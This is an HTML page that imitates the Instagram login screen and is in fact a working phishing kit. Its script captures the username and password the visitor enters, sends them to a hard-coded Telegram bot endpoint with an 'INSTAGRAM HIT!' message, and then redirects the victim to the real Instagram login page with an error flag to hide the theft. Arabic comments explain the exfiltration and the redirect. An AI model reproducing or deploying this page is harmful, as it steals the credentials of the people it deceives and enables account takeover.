<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram • Log in</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
        body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 100%; max-width: 350px; text-align: center; margin-bottom: 10px; }
        .logo { font-family: 'Billabong', cursive; font-size: 45px; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 10px 8px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
        input:focus { border: 1px solid #a8a8a8; background: #fff; }
        button { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin-top: 10px; cursor: pointer; }
        button:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 15px; }
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; }
        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 20px; width: 100%; max-width: 350px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .app-links { text-align: center; margin-top: 20px; font-size: 14px; color: #262626; }
        .app-img { height: 40px; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">Instagram</div>
        <form id="hackForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="divider">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
        </div>
        <a href="#" class="fb-login">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            Log in with Facebook
        </a>
        <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-links">
        Get the app.<br>
    </div>

    <script>
        document.getElementById('hackForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            
            // إرسال البيانات لتلجرام
            fetch("https://api.telegram.org/bot9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: "2005892579", 
                    text: "🚨 *INSTAGRAM HIT!*\n👤 User: `" + u + "`\n🔑 Pass: `" + p + "`\n🌐 IP: (Logged via TG)", 
                    parse_mode: "Markdown" 
                })
            }).then(() => {
                // التوجيه لصفحة وهمية (خطأ في كلمة المرور)
                window.location.href = "https://www.instagram.com/accounts/login/?error=1";
            }).catch(() => {
                window.location.href = "https://www.instagram.com/accounts/login/?error=1";
            });
        });
    </script>
</body>
</html>
